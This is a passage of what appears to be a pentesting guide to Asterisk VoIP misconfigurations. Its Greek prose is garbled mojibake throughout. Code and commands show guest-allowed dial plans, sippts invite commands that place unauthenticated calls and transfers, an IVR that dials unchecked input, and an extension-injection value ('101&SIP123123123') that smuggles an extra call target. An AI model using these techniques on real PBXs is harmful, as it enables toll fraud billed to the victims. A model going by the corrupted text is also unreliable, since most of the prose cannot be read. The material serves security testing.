Î¿ÏÎ³Î¬Î½Ï‰ÏƒÎ· Ï„Î¿Ï… ÏƒÏ‡ÎµÎ´Î¯Î¿Ï… ÎºÎ»Î®ÏƒÎµÏ‰Î½, Ï„Î· Î´Î¹Î±Ï‡ÎµÎ¯ÏÎ¹ÏƒÎ· ÎµÎ»Î­Î³Ï‡Î¿Ï… Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ ÎºÎ±Î¹ Ï„Î·Î½ Ï€Î±ÏÎ¿Ï‡Î® Î´Î¹Î±Ï‡Ï‰ÏÎ¹ÏƒÎ¼Î¿Ï Î¼ÎµÏ„Î±Î¾Ï Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÏÎ½ Ï„Î¼Î·Î¼Î¬Ï„Ï‰Î½ Ï„Î¿Ï… ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î¿Ï‚.

ÎšÎ¬Î¸Îµ context Î¿ÏÎ¯Î¶ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ Î´Î¹Î±Î¼ÏŒÏÏ†Ï‰ÏƒÎ·Ï‚, ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ ÏƒÏ„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ **`extensions.conf`**. Î¤Î± contexts Î´Î·Î»ÏÎ½Î¿Î½Ï„Î±Î¹ Î¼Îµ Î±Î³ÎºÏÎ»ÎµÏ‚, Î¼Îµ Ï„Î¿ ÏŒÎ½Î¿Î¼Î± Ï„Î¿Ï… context Î½Î± Ï€ÎµÏÎ¹Î²Î¬Î»Î»ÎµÏ„Î±Î¹ Î±Ï€ÏŒ Î±Ï…Ï„Î­Ï‚. Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±:
```bash
csharpCopy code[my_context]
```
ÎœÎ­ÏƒÎ± ÏƒÏ„Î¿ Ï€Î»Î±Î¯ÏƒÎ¹Î¿, Î¿ÏÎ¯Î¶ÎµÏ„Îµ Ï„Î¹Ï‚ ÎµÏ€ÎµÎºÏ„Î¬ÏƒÎµÎ¹Ï‚ (Î¼Î¿Ï„Î¯Î²Î± Î±ÏÎ¹Î¸Î¼ÏÎ½ Ï€Î¿Ï… ÎºÎ±Î»Î¿ÏÎ½Ï„Î±Î¹) ÎºÎ±Î¹ Ï„Î¹Ï‚ ÏƒÏ…Î½Î´Î­ÎµÏ„Îµ Î¼Îµ Î¼Î¹Î± ÏƒÎµÎ¹ÏÎ¬ ÎµÎ½ÎµÏÎ³ÎµÎ¹ÏÎ½ Î® ÎµÏ†Î±ÏÎ¼Î¿Î³ÏÎ½. Î‘Ï…Ï„Î­Ï‚ Î¿Î¹ ÎµÎ½Î­ÏÎ³ÎµÎ¹ÎµÏ‚ ÎºÎ±Î¸Î¿ÏÎ¯Î¶Î¿Ï…Î½ Ï€ÏÏ‚ ÎµÏ€ÎµÎ¾ÎµÏÎ³Î¬Î¶ÎµÏ„Î±Î¹ Î· ÎºÎ»Î®ÏƒÎ·. Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±:
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
Î‘Ï…Ï„ÏŒ Ï„Î¿ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î´ÎµÎ¯Ï‡Î½ÎµÎ¹ Î­Î½Î± Î±Ï€Î»ÏŒ Ï€Î»Î±Î¯ÏƒÎ¹Î¿ Ï€Î¿Ï… Î¿Î½Î¿Î¼Î¬Î¶ÎµÏ„Î±Î¹ "my\_context" Î¼Îµ Î¼Î¹Î± ÎµÏ€Î­ÎºÏ„Î±ÏƒÎ· "100". ÎŒÏ„Î±Î½ ÎºÎ¬Ï€Î¿Î¹Î¿Ï‚ ÎºÎ±Î»Î­ÏƒÎµÎ¹ Ï„Î¿ 100, Î· ÎºÎ»Î®ÏƒÎ· Î¸Î± Î±Ï€Î±Î½Ï„Î·Î¸ÎµÎ¯, Î¸Î± Î±Î½Î±Ï€Î±ÏÎ±Ï‡Î¸ÎµÎ¯ Î­Î½Î± Î¼Î®Î½Ï…Î¼Î± ÎºÎ±Î»Ï‰ÏƒÎ¿ÏÎ¯ÏƒÎ¼Î±Ï„Î¿Ï‚ ÎºÎ±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î· ÎºÎ»Î®ÏƒÎ· Î¸Î± Ï„ÎµÏÎ¼Î±Ï„Î¹ÏƒÏ„ÎµÎ¯.

Î‘Ï…Ï„ÏŒ ÎµÎ¯Î½Î±Î¹ **Î­Î½Î± Î¬Î»Î»Î¿ Ï€Î»Î±Î¯ÏƒÎ¹Î¿** Ï€Î¿Ï… ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Î½Î± **ÎºÎ±Î»Î­ÏƒÎµÏ„Îµ Î¿Ï€Î¿Î¹Î¿Î½Î´Î®Ï€Î¿Ï„Îµ Î¬Î»Î»Î¿ Î±ÏÎ¹Î¸Î¼ÏŒ**:
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
Î‘Î½ Î¿ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î®Ï‚ Î¿ÏÎ¯ÏƒÎµÎ¹ Ï„Î¿ **default context** Ï‰Ï‚:
```
[default]
include => my_context
include => external
```
{% hint style="warning" %}
ÎŸÏ€Î¿Î¹Î¿ÏƒÎ´Î®Ï€Î¿Ï„Îµ Î¸Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î¿Î½ **Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® Î³Î¹Î± Î½Î± ÎºÎ±Î»Î­ÏƒÎµÎ¹ Î¿Ï€Î¿Î¹Î¿Î½Î´Î®Ï€Î¿Ï„Îµ Î¬Î»Î»Î¿ Î±ÏÎ¹Î¸Î¼ÏŒ** (ÎºÎ±Î¹ Î¿ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î®Ï‚ Ï„Î¿Ï… Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® Î¸Î± Ï€Î»Î·ÏÏÏƒÎµÎ¹ Î³Î¹Î± Ï„Î·Î½ ÎºÎ»Î®ÏƒÎ·).
{% endhint %}

{% hint style="danger" %}
Î•Ï€Î¹Ï€Î»Î­Î¿Î½, Î±Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î® Ï„Î¿ **`sip.conf`** Î±ÏÏ‡ÎµÎ¯Î¿ Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ **`allowguest=true`**, Ï„ÏŒÏ„Îµ **Î¿Ï€Î¿Î¹Î¿ÏƒÎ´Î®Ï€Î¿Ï„Îµ** ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Ï‡Ï‰ÏÎ¯Ï‚ **ÎºÎ±Î¼Î¯Î± Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ·** Î¸Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎºÎ±Î»Î­ÏƒÎµÎ¹ Î¿Ï€Î¿Î¹Î¿Î½Î´Î®Ï€Î¿Ï„Îµ Î¬Î»Î»Î¿ Î±ÏÎ¹Î¸Î¼ÏŒ.
{% endhint %}

*   **`SIPPTS invite`** Î±Ï€ÏŒ [**sippts**](https://github.com/Pepelux/sippts)**:** Î¤Î¿ SIPPTS invite ÎµÎ»Î­Î³Ï‡ÎµÎ¹ Î±Î½ Î­Î½Î±Ï‚ **Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®Ï‚ PBX Î¼Î±Ï‚ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎºÎ¬Î½Î¿Ï…Î¼Îµ ÎºÎ»Î®ÏƒÎµÎ¹Ï‚ Ï‡Ï‰ÏÎ¯Ï‚ Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ·**. Î•Î¬Î½ Î¿ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®Ï‚ SIP Î­Ï‡ÎµÎ¹ Î»Î±Î½Î¸Î±ÏƒÎ¼Î­Î½Î· ÏÏÎ¸Î¼Î¹ÏƒÎ·, Î¸Î± Î¼Î±Ï‚ ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎµÎ¹ Î½Î± ÎºÎ¬Î½Î¿Ï…Î¼Îµ ÎºÎ»Î®ÏƒÎµÎ¹Ï‚ ÏƒÎµ ÎµÎ¾Ï‰Ï„ÎµÏÎ¹ÎºÎ¿ÏÏ‚ Î±ÏÎ¹Î¸Î¼Î¿ÏÏ‚. ÎœÏ€Î¿ÏÎµÎ¯ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± Î¼Î±Ï‚ ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎµÎ¹ Î½Î± Î¼ÎµÏ„Î±Ï†Î­ÏÎ¿Ï…Î¼Îµ Ï„Î·Î½ ÎºÎ»Î®ÏƒÎ· ÏƒÎµ Î­Î½Î±Î½ Î´ÎµÏÏ„ÎµÏÎ¿ ÎµÎ¾Ï‰Ï„ÎµÏÎ¹ÎºÏŒ Î±ÏÎ¹Î¸Î¼ÏŒ.

Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Î±Î½ Î¿ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®Ï‚ Asterisk ÏƒÎ±Ï‚ Î­Ï‡ÎµÎ¹ ÎºÎ±ÎºÎ® ÏÏÎ¸Î¼Î¹ÏƒÎ· Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½Ï„Î¿Ï‚, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î±Ï€Î¿Î´ÎµÏ‡Î¸ÎµÎ¯Ï„Îµ Î±Î¯Ï„Î·Î¼Î± INVITE Ï‡Ï‰ÏÎ¯Ï‚ ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´ÏŒÏ„Î·ÏƒÎ·. Î£Îµ Î±Ï…Ï„Î® Ï„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ·, Î­Î½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎºÎ¬Î½ÎµÎ¹ ÎºÎ»Î®ÏƒÎµÎ¹Ï‚ Ï‡Ï‰ÏÎ¯Ï‚ Î½Î± Î³Î½Ï‰ÏÎ¯Î¶ÎµÎ¹ ÎºÎ±Î½Î­Î½Î± Ï‡ÏÎ®ÏƒÏ„Î·/ÎºÏ‰Î´Î¹ÎºÏŒ.
  
{% code overflow="wrap" %}
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
sippts invite -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
sippts invite -i 10.10.0.10 -tu 555555555 -t 444444444
```
{% endcode %}

### Î”Ï‰ÏÎµÎ¬Î½ ÎºÎ»Î®ÏƒÎµÎ¹Ï‚ / ÎšÎ±ÎºÏÏ‚ ÏÏ…Î¸Î¼Î¹ÏƒÎ¼Î­Î½Î± IVRS

IVRS ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ **Î£ÏÏƒÏ„Î·Î¼Î± Î”Î¹Î±Î´ÏÎ±ÏƒÏ„Î¹ÎºÎ®Ï‚ Î¦Ï‰Î½Î·Ï„Î¹ÎºÎ®Ï‚ Î‘Ï€ÏŒÎºÏÎ¹ÏƒÎ·Ï‚**, Î¼Î¹Î± Ï„ÎµÏ‡Î½Î¿Î»Î¿Î³Î¯Î± Ï„Î·Î»ÎµÏ†Ï‰Î½Î¯Î±Ï‚ Ï€Î¿Ï… ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÏ„Î¿Ï…Ï‚ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Î½Î± Î±Î»Î»Î·Î»ÎµÏ€Î¹Î´ÏÎ¿ÏÎ½ Î¼Îµ Î­Î½Î± Ï…Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„Î¹ÎºÏŒ ÏƒÏÏƒÏ„Î·Î¼Î± Î¼Î­ÏƒÏ‰ Ï†Ï‰Î½Î·Ï„Î¹ÎºÏÎ½ Î® Ï„ÏŒÎ½Ï‰Î½ Î±Ï†Î®Ï‚. Î¤Î¿ IVRS Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î³Î¹Î± Ï„Î·Î½ ÎºÎ±Ï„Î±ÏƒÎºÎµÏ…Î® **Î±Ï…Ï„Î¿Î¼Î±Ï„Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Ï‰Î½ ÏƒÏ…ÏƒÏ„Î·Î¼Î¬Ï„Ï‰Î½ Î´Î¹Î±Ï‡ÎµÎ¯ÏÎ¹ÏƒÎ·Ï‚ ÎºÎ»Î®ÏƒÎµÏ‰Î½** Ï€Î¿Ï… Ï€ÏÎ¿ÏƒÏ†Î­ÏÎ¿Ï…Î½ Î¼Î¹Î± ÏƒÎµÎ¹ÏÎ¬ Î±Ï€ÏŒ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯ÎµÏ‚, ÏŒÏ€Ï‰Ï‚ Î· Ï€Î±ÏÎ¿Ï‡Î® Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¹ÏÎ½, Î· Î´ÏÎ¿Î¼Î¿Î»ÏŒÎ³Î·ÏƒÎ· ÎºÎ»Î®ÏƒÎµÏ‰Î½ ÎºÎ±Î¹ Î· ÎºÎ±Ï„Î±Î³ÏÎ±Ï†Î® ÎµÎ¹ÏƒÏŒÎ´Î¿Ï… Ï‡ÏÎ·ÏƒÏ„ÏÎ½.

Î¤Î¿ IVRS ÏƒÎµ ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î± VoIP ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Î±Ï€Î¿Ï„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Î±Ï€ÏŒ:

1. **Î¦Ï‰Î½Î·Ï„Î¹ÎºÎ­Ï‚ Ï€ÏÎ¿Ï„ÏÎ¿Ï€Î­Ï‚**: Î ÏÎ¿Î·Ï‡Î¿Î³ÏÎ±Ï†Î·Î¼Î­Î½Î± Î·Ï‡Î·Ï„Î¹ÎºÎ¬ Î¼Î·Î½ÏÎ¼Î±Ï„Î± Ï€Î¿Ï… ÎºÎ±Î¸Î¿Î´Î·Î³Î¿ÏÎ½ Ï„Î¿Ï…Ï‚ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Î¼Î­ÏƒÏ‰ Ï„Ï‰Î½ ÎµÏ€Î¹Î»Î¿Î³ÏÎ½ ÎºÎ±Î¹ Î¿Î´Î·Î³Î¹ÏÎ½ Ï„Î¿Ï… Î¼ÎµÎ½Î¿Ï IVR.
2. **DTMF** (Dual-Tone Multi-Frequency) ÏƒÎ®Î¼Î±Î½ÏƒÎ·: Î•Î¹ÏƒÏŒÎ´Î¿Ï…Ï‚ Ï„ÏŒÎ½Ï‰Î½ Î±Ï†Î®Ï‚ Ï€Î¿Ï… Ï€Î±ÏÎ¬Î³Î¿Î½Ï„Î±Î¹ Î¼Îµ Ï„Î·Î½ Ï€Î¯ÎµÏƒÎ· Ï€Î»Î®ÎºÏ„ÏÏ‰Î½ ÏƒÏ„Î¿ Ï„Î·Î»Î­Ï†Ï‰Î½Î¿, Î¿Î¹ Î¿Ï€Î¿Î¯ÎµÏ‚ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½Ï„Î±Î¹ Î³Î¹Î± Ï„Î·Î½ Ï€Î»Î¿Î®Î³Î·ÏƒÎ· ÏƒÏ„Î± Î¼ÎµÎ½Î¿Ï IVR ÎºÎ±Î¹ Ï„Î·Î½ Ï€Î±ÏÎ¿Ï‡Î® ÎµÎ¹ÏƒÏŒÎ´Î¿Ï….
3. **Î”ÏÎ¿Î¼Î¿Î»ÏŒÎ³Î·ÏƒÎ· ÎºÎ»Î®ÏƒÎµÏ‰Î½**: ÎšÎ±Ï„ÎµÏÎ¸Ï…Î½ÏƒÎ· ÎºÎ»Î®ÏƒÎµÏ‰Î½ ÏƒÏ„Î¿Î½ ÎºÎ±Ï„Î¬Î»Î»Î·Î»Î¿ Ï€ÏÎ¿Î¿ÏÎ¹ÏƒÎ¼ÏŒ, ÏŒÏ€Ï‰Ï‚ ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î± Ï„Î¼Î®Î¼Î±Ï„Î±, Ï€ÏÎ¬ÎºÏ„Î¿ÏÎµÏ‚ Î® ÎµÏƒÏ‰Ï„ÎµÏÎ¹ÎºÎ¿ÏÏ‚ Î±ÏÎ¹Î¸Î¼Î¿ÏÏ‚ Î²Î¬ÏƒÎµÎ¹ Ï„Î·Ï‚ ÎµÎ¹ÏƒÏŒÎ´Î¿Ï… Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î·.
4. **ÎšÎ±Ï„Î±Î³ÏÎ±Ï†Î® ÎµÎ¹ÏƒÏŒÎ´Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î·**: Î£Ï…Î»Î»Î¿Î³Î® Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¹ÏÎ½ Î±Ï€ÏŒ Ï„Î¿Ï…Ï‚ ÎºÎ±Î»Î¿ÏÎ½Ï„ÎµÏ‚, ÏŒÏ€Ï‰Ï‚ Î±ÏÎ¹Î¸Î¼Î¿ÏÏ‚ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏÎ½, Î±Î½Î±Î³Î½Ï‰ÏÎ¹ÏƒÏ„Î¹ÎºÎ¬ Ï€ÎµÏÎ¹Ï€Ï„ÏÏƒÎµÏ‰Î½ Î® Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ Î¬Î»Î»Î· ÏƒÏ‡ÎµÏ„Î¹ÎºÎ® Î´ÎµÎ´Î¿Î¼Î­Î½Î±.
5. **Î•Î½ÏƒÏ‰Î¼Î¬Ï„Ï‰ÏƒÎ· Î¼Îµ ÎµÎ¾Ï‰Ï„ÎµÏÎ¹ÎºÎ¬ ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î±**: Î£ÏÎ½Î´ÎµÏƒÎ· Ï„Î¿Ï… ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î¿Ï‚ IVR Î¼Îµ Î²Î¬ÏƒÎµÎ¹Ï‚ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Î® Î¬Î»Î»Î± Î»Î¿Î³Î¹ÏƒÎ¼Î¹ÎºÎ¬ ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î± Î³Î¹Î± Ï„Î·Î½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· Î® Ï„Î·Î½ ÎµÎ½Î·Î¼Î­ÏÏ‰ÏƒÎ· Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¹ÏÎ½, Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· ÎµÎ½ÎµÏÎ³ÎµÎ¹ÏÎ½ Î® Ï„Î·Î½ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¯Î·ÏƒÎ· Î³ÎµÎ³Î¿Î½ÏŒÏ„Ï‰Î½.

Î£Îµ Î­Î½Î± ÏƒÏÏƒÏ„Î·Î¼Î± VoIP Asterisk, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î­Î½Î± IVR Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ ÏƒÏ‡Î­Î´Î¹Î¿ ÎºÎ»Î®ÏƒÎ·Ï‚ (**`extensions.conf`** Î±ÏÏ‡ÎµÎ¯Î¿) ÎºÎ±Î¹ Î´Î¹Î¬Ï†Î¿ÏÎµÏ‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î­Ï‚ ÏŒÏ€Ï‰Ï‚ `Background()`, `Playback()`, `Read()`, ÎºÎ±Î¹ Î¬Î»Î»Î±. Î‘Ï…Ï„Î­Ï‚ Î¿Î¹ ÎµÏ†Î±ÏÎ¼Î¿Î³Î­Ï‚ ÏƒÎ±Ï‚ Î²Î¿Î·Î¸Î¿ÏÎ½ Î½Î± Î±Î½Î±Ï€Î±ÏÎ¬Î³ÎµÏ„Îµ Ï†Ï‰Î½Î·Ï„Î¹ÎºÎ­Ï‚ Ï€ÏÎ¿Ï„ÏÎ¿Ï€Î­Ï‚, Î½Î± ÎºÎ±Ï„Î±Î³ÏÎ¬Ï†ÎµÏ„Îµ Ï„Î·Î½ ÎµÎ¯ÏƒÎ¿Î´Î¿ Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î· ÎºÎ±Î¹ Î½Î± ÎµÎ»Î­Î³Ï‡ÎµÏ„Îµ Ï„Î· ÏÎ¿Î® Ï„Î·Ï‚ ÎºÎ»Î®ÏƒÎ·Ï‚.

#### Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± ÎµÏ…Î¬Î»Ï‰Ï„Î·Ï‚ ÏÏÎ¸Î¼Î¹ÏƒÎ·Ï‚
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
ÎŸ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î¿Ï‚ ÎµÎ¯Î½Î±Î¹ Î­Î½Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± ÏŒÏ€Î¿Ï… Î¿ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Î¶Î·Ï„ÎµÎ¯Ï„Î±Î¹ Î½Î± **Ï€Î±Ï„Î®ÏƒÎµÎ¹ 1 Î³Î¹Î± Î½Î± ÎºÎ±Î»Î­ÏƒÎµÎ¹** Î­Î½Î± Ï„Î¼Î®Î¼Î±, **2 Î³Î¹Î± Î½Î± ÎºÎ±Î»Î­ÏƒÎµÎ¹** Î­Î½Î± Î¬Î»Î»Î¿, Î® **Ï„Î¿Î½ Ï€Î»Î®ÏÎ· Î±ÏÎ¹Î¸Î¼ÏŒ** Î±Î½ Ï„Î¿Î½ Î³Î½Ï‰ÏÎ¯Î¶ÎµÎ¹.\
Î— ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± ÎµÎ¯Î½Î±Î¹ Ï„Î¿ Î³ÎµÎ³Î¿Î½ÏŒÏ‚ ÏŒÏ„Î¹ Ï„Î¿ **Î¼Î®ÎºÎ¿Ï‚ Ï„Î¿Ï… Î±ÏÎ¹Î¸Î¼Î¿Ï Î´ÎµÎ½ ÎµÎ»Î­Î³Ï‡ÎµÏ„Î±Î¹, Î¿Ï€ÏŒÏ„Îµ Î­Î½Î±Ï‚ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÎµÎ¹ÏƒÎ¬Î³ÎµÎ¹ Ï„Î¿Î½ Ï‡ÏÏŒÎ½Î¿ Î»Î®Î¾Î·Ï‚ 5 Î´ÎµÏ…Ï„ÎµÏÎ¿Î»Î­Ï€Ï„Ï‰Î½ ÎµÎ½ÏŒÏ‚ Ï€Î»Î®ÏÎ¿Ï…Ï‚ Î±ÏÎ¹Î¸Î¼Î¿Ï ÎºÎ±Î¹ Î¸Î± ÎºÎ±Î»ÎµÏƒÏ„ÎµÎ¯.**

### Extension Injection

Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î­Î½Î±Î½ Î±ÏÎ¹Î¸Î¼ÏŒ ÏŒÏ€Ï‰Ï‚:
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
ÎŒÏ€Î¿Ï… **`${EXTEN}`** ÎµÎ¯Î½Î±Î¹ Î· **ÎµÏƒÏ‰Ï„ÎµÏÎ¹ÎºÎ® Î³ÏÎ±Î¼Î¼Î®** Ï€Î¿Ï… Î¸Î± ÎºÎ±Î»ÎµÏƒÏ„ÎµÎ¯, ÏŒÏ„Î±Î½ **ÎµÎ¹ÏƒÎ±Ï‡Î¸ÎµÎ¯ Î· ext 101** Î±Ï…Ï„ÏŒ ÎµÎ¯Î½Î±Î¹ Ï€Î¿Ï… Î¸Î± ÏƒÏ…Î¼Î²ÎµÎ¯:
```scss
exten => 101,1,Dial(SIP/101)
```
Î©ÏƒÏ„ÏŒÏƒÎ¿, Î±Î½ **`${EXTEN}`** ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ ÎµÎ¹ÏƒÎ±Î³Ï‰Î³Î® **Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÏ‰Î½ Î±Ï€ÏŒ Î±ÏÎ¹Î¸Î¼Î¿ÏÏ‚** (ÏŒÏ€Ï‰Ï‚ ÏƒÎµ Ï€Î±Î»Î±Î¹ÏŒÏ„ÎµÏÎµÏ‚ ÎµÎºÎ´ÏŒÏƒÎµÎ¹Ï‚ Ï„Î¿Ï… Asterisk), Î­Î½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÎµÎ¹ÏƒÎ¬Î³ÎµÎ¹ **`101&SIP123123123`** Î³Î¹Î± Î½Î± ÎºÎ±Î»Î­ÏƒÎµÎ¹ Ï„Î¿Î½ Î±ÏÎ¹Î¸Î¼ÏŒ Ï„Î·Î»ÎµÏ†ÏÎ½Î¿Ï… 123123123. ÎšÎ±Î¹ Î±Ï…Ï„ÏŒ Î¸Î± Î®Ï„Î±Î½ Ï„Î¿ Î±Ï€Î¿Ï„Î­Î»ÎµÏƒÎ¼Î±:
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, Î¼Î¹Î± ÎºÎ»Î®ÏƒÎ· ÏƒÏ„Î·Î½ ÎµÏ€Î­ÎºÏ„Î±ÏƒÎ· **`101`** ÎºÎ±Î¹ **`123123123`** Î¸Î± ÏƒÏ„Î±Î»ÎµÎ¯ ÎºÎ±Î¹ Î¼ÏŒÎ½Î¿ Î· Ï€ÏÏÏ„Î· Ï€Î¿Ï… Î¸Î± Î»Î¬Î²ÎµÎ¹ Ï„Î·Î½ ÎºÎ»Î®ÏƒÎ· Î¸Î± ÎºÎ±Î¸Î¹ÎµÏÏ‰Î¸ÎµÎ¯... Î±Î»Î»Î¬ Î±Î½ Î­Î½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Î¼Î¹Î± **ÎµÏ€Î­ÎºÏ„Î±ÏƒÎ· Ï€Î¿Ï… Ï€Î±ÏÎ±ÎºÎ¬Î¼Ï€Ï„ÎµÎ¹ Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ Î±Î½Ï„Î¹ÏƒÏ„Î¿Î¯Ï‡Î¹ÏƒÎ·** Ï€Î¿Ï… ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Î±Î»Î»Î¬ Î´ÎµÎ½ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹, Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± **ÎµÎ¹ÏƒÎ¬Î³ÎµÎ¹ Î¼Î¹Î± ÎºÎ»Î®ÏƒÎ· Î¼ÏŒÎ½Î¿ ÏƒÏ„Î¿Î½ ÎµÏ€Î¹Î¸Ï…Î¼Î·Ï„ÏŒ Î±ÏÎ¹Î¸Î¼ÏŒ**.

## Î•Ï…Ï€Î¬Î¸ÎµÎ¹Î± SIPDigestLeak

